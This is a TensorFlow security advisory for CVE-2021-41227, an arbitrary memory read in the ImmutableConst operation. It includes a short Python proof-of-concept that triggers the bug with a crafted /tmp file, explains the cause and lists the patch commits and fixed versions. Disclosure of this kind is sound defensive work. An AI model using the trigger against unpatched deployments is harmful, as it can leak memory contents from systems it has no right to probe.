<h2>TFSA-2021-170: Arbitrary memory read in <code>ImmutableConst</code></h2>
<h3>CVE Number</h3>
<p>CVE-2021-41227</p>
<h3>Impact</h3>
<p>The <code>ImmutableConst</code> operation in TensorFlow can be tricked into reading arbitrary memory contents:</p>
<p>```python
import tensorflow as tf</p>
<p>with open('/tmp/test','wb') as f:
    f.write(b'\xe2'*128)
    data = tf.raw_ops.ImmutableConst(dtype=tf.string,shape=3,memory_region_name='/tmp/test')</p>
<p>print(data)
```</p>
<p>This is because the <code>tstring</code> TensorFlow string class has a special case for memory mapped strings but the operation itself does not offer any support for this datatype.</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/3712a2d3455e6ccb924daa5724a3652a86f6b585">3712a2d3455e6ccb924daa5724a3652a86f6b585</a> and GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/1cb6bb6c2a6019417c9adaf9e6843ba75ee2580b">1cb6bb6c2a6019417c9adaf9e6843ba75ee2580b</a>.</p>
<p>The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.</p>
